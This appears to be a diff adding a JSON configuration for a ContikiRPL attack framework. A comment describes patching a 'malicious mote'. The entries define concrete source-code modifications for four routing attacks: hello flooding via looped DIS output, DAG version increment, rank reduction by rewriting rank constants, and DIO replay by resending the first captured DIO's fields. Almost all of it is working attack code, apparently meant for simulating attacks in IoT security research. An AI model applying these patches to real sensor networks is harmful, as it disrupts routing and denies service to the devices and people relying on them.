@@ -1,0 +1,82 @@
+/*
+
+Building blocks consist of either ContikiRPL configuration constants or single-line based source code modifications,
+ e.g. :
+
+ "...": {
+   "RPL_CONF_DIO_INTERVAL_MIN": 1
+ }
+
+ will set the configuration constant RPL_CONF_DIO_INTERVAL_MIN to 1 at the beginning of the malicious mote's code
+
+ while
+
+ "...": {
+   "rpl-icmp6.c": ["dag->version;", "dag->version++;"]
+ }
+
+ will modify rpl-icmp6.c from the ContikiRPL library at line where "dag->version;" appears to "dag->version++;"
+
+ */
+
+{
+  "hello-flood": {
+    "RPL_CONF_DIS_INTERVAL": 0,
+    "RPL_CONF_DIS_START_DELAY": 0,
+    "rpl-timers.c": ["next_dis++;", "next_dis++; int i=0; while (i<20) {i++; dis_output(NULL);}"]
+  },
+  "increased-version": {
+    "rpl-icmp6.c": ["dag->version;", "dag->version++;"]
+  },
+  "decreased-rank": {
+    "RPL_CONF_MIN_HOPRANKINC": 0,
+    "rpl-private.h": [
+      ["#define RPL_MAX_RANKINC             (7 * RPL_MIN_HOPRANKINC)", "#define RPL_MAX_RANKINC 0"],
+      ["#define INFINITE_RANK                   0xffff", "#define INFINITE_RANK 256"]
+    ],
+    "rpl-timers.c": ["rpl_recalculate_ranks();", null]
+  },
+  "replay": {
+  	"RPL_CONF_DIO_INTERVAL_DOUBLINGS": 0,
+  	"rpl-conf.h": [
+      ["#define RPL_DIO_INTERVAL_MIN        12","#define RPL_DIO_INTERVAL_MIN        11"],
+      ["#define RPL_DIO_INTERVAL_DOUBLINGS  8", "#define RPL_DIO_INTERVAL_DOUBLINGS  0"]
+    ],
+    "rpl-icmp6.c" : [
+    	["rpl_process_dio(&from, &dio);","if(firstDID == 0){ firstDID = 1; memset(&prevDIO, 0, sizeof(dio)); prevDIO = dio; uip_ipaddr_copy(&DIOsrcaddr, &UIP_IP_BUF->srcipaddr);} rpl_process_dio(&from, &dio);"],
+    	["buffer[pos++]=instance->instance_id;","if(firstDID == 0){buffer[pos++]=instance->instance_id;}else{buffer[pos++]=prevDIO.instance_id;}"],
+    	["buffer[pos++]=dag->version;","if(firstDID == 0){buffer[pos++]=dag->version;}else{buffer[pos++]=prevDIO.version;}"],
+    	["set16(buffer, pos, dag->rank);","if(firstDID == 0){set16(buffer, pos, dag->rank);}else{set16(buffer, pos, prevDIO.rank);}"],
+    	["if(dag->grounded) { buffer[pos] |= RPL_DIO_GROUNDED; }","if(firstDID == 0){if(dag->grounded) { buffer[pos] |= RPL_DIO_GROUNDED; }}else{if(prevDIO.grounded) { buffer[pos] |= RPL_DIO_GROUNDED; }}"],
+    	["buffer[pos] |= instance->mop << RPL_DIO_MOP_SHIFT;","if(firstDID == 0){buffer[pos] |= instance->mop << RPL_DIO_MOP_SHIFT;}else{buffer[pos] |= prevDIO.mop << RPL_DIO_MOP_SHIFT;}"],
+    	["buffer[pos] |= dag->preference & RPL_DIO_PREFERENCE_MASK;","if(firstDID == 0){buffer[pos] |= dag->preference & RPL_DIO_PREFERENCE_MASK;}else{buffer[pos] |= prevDIO.preference & RPL_DIO_PREFERENCE_MASK;}"],
+    	["buffer[pos++] = instance->dtsn_out;","if(firstDID == 0){buffer[pos++] = instance->dtsn_out;}else{buffer[pos++] = prevDIO.dtsn;}"],
+    	["RPL_LOLLIPOP_INCREMENT(instance->dtsn_out);","if(firstDID == 0){RPL_LOLLIPOP_INCREMENT(instance->dtsn_out);}else{RPL_LOLLIPOP_INCREMENT(prevDIO.dtsn);}"],
+    	["memcpy(buffer + pos, &dag->dag_id,sizeof(dag->dag_id));","if(firstDID == 0){memcpy(buffer + pos, &dag->dag_id,sizeof(dag->dag_id));}else{memcpy(buffer + pos, &prevDIO.dag_id,sizeof(prevDIO.dag_id));}"],
+    	["buffer[pos++] = instance->mc.type;","if(firstDID == 0){buffer[pos++] = instance->mc.type;}else{buffer[pos++] = prevDIO.mc.type;}"],
+    	["buffer[pos++] = instance->mc.flags >> 1;","if(firstDID == 0){buffer[pos++] = instance->mc.flags >> 1;}else{buffer[pos++] = prevDIO.mc.flags >> 1;}"],
+    	["buffer[pos] = (instance->mc.flags & 1) << 7;","if(firstDID == 0){buffer[pos] = (instance->mc.flags & 1) << 7;}else{buffer[pos] = (prevDIO.mc.flags & 1) << 7;}"],
+    	["buffer[pos++] |= (instance->mc.aggr << 4) | instance->mc.prec;","if(firstDID == 0){buffer[pos++] |= (instance->mc.aggr << 4) | instance->mc.prec;}else{buffer[pos++] |= (prevDIO.mc.aggr << 4) | prevDIO.mc.prec;}"],
+    	["set16(buffer, pos, instance->mc.obj.etx);","if(firstDID == 0){set16(buffer, pos, instance->mc.obj.etx);}else{set16(buffer, pos, prevDIO.mc.obj.etx);}"],
+    	["buffer[pos++] = instance->mc.obj.energy.flags;","if(firstDID == 0){buffer[pos++] = instance->mc.obj.energy.flags;}else{buffer[pos++] = prevDIO.mc.obj.energy.flags;}"],
+    	["buffer[pos++] = instance->mc.obj.energy.energy_est;","if(firstDID == 0){buffer[pos++] = instance->mc.obj.energy.energy_est;}else{buffer[pos++] = prevDIO.mc.obj.energy.energy_est;}"],
+    	["(unsigned)instance->mc.type","firstDID==1?(unsigned)prevDIO.mc.type:(unsigned)instance->mc.type"],
+    	["buffer[pos++] = instance->dio_intdoubl;","if(firstDID == 0){buffer[pos++] = prevDIO.dag_intdoubl;}else{buffer[pos++] = instance->dio_intdoubl;}"],
+    	["buffer[pos++] = instance->dio_intmin;","if(firstDID == 0){buffer[pos++] = instance->dio_intmin;}else{buffer[pos++] = prevDIO.dag_intmin;}"],
+    	["buffer[pos++] = instance->dio_redundancy;","if(firstDID == 0){buffer[pos++] = instance->dio_redundancy;}else{buffer[pos++] = prevDIO.dag_redund;}"],
+    	["set16(buffer, pos, instance->max_rankinc);","if(firstDID == 0){set16(buffer, pos, instance->max_rankinc);}else{set16(buffer, pos, prevDIO.dag_max_rankinc);}"],
+    	["set16(buffer, pos, instance->min_hoprankinc);","if(firstDID == 0){set16(buffer, pos, instance->min_hoprankinc);}else{set16(buffer, pos, prevDIO.dag_min_hoprankinc);}"],
+    	["set16(buffer, pos, instance->of->ocp);","if(firstDID == 0){set16(buffer, pos, instance->of->ocp);}else{set16(buffer, pos, prevDIO.ocp);}"],
+    	["buffer[pos++] = instance->default_lifetime;","if(firstDID == 0){buffer[pos++] = instance->default_lifetime;}else{buffer[pos++] = prevDIO.default_lifetime;}"],
+    	["set16(buffer, pos, instance->lifetime_unit);","if(firstDID == 0){set16(buffer, pos, instance->lifetime_unit);}else{set16(buffer, pos, prevDIO.lifetime_unit);}"],
+    	["buffer[pos++] = dag->prefix_info.length;","if(firstDID == 0){buffer[pos++] = dag->prefix_info.length;}else{buffer[pos++] = prevDIO.prefix_info.length;}"],
+    	["buffer[pos++] = dag->prefix_info.flags;","if(firstDID == 0){buffer[pos++] = dag->prefix_info.flags;}else{buffer[pos++] = prevDIO.prefix_info.flags;}"],
+    	["set32(buffer, pos, dag->prefix_info.lifetime);","if(firstDID == 0){set32(buffer, pos, dag->prefix_info.lifetime);}else{set32(buffer, pos, prevDIO.prefix_info.lifetime);}"],
+    	["memcpy(&buffer[pos], &dag->prefix_info.prefix, 16);","if(firstDID == 0){memcpy(&buffer[pos], &dag->prefix_info.prefix, 16);}else{memcpy(&buffer[pos], &prevDIO.prefix_info.prefix, 16);}"],
+    	["PRINT6ADDR(&dag->prefix_info.prefix);","if(firstDID == 0){PRINT6ADDR(&dag->prefix_info.prefix);}else{PRINT6ADDR(&prevDIO.prefix_info.prefix);}"],
+    	[",dag->prefix_info.length",",firstDID==1?prevDIO.prefix_info.length:dag->prefix_info.length"],
+    	["(unsigned)dag->rank","firstDID==1?(unsigned)prevDIO.rank:(unsigned)dag->rank"],
+    	["(unsigned)instance->current_dag->rank","firstDID==1?(unsigned)prevDIO.rank:(unsigned)instance->current_dag->rank"]
+    ]
+  }
+}
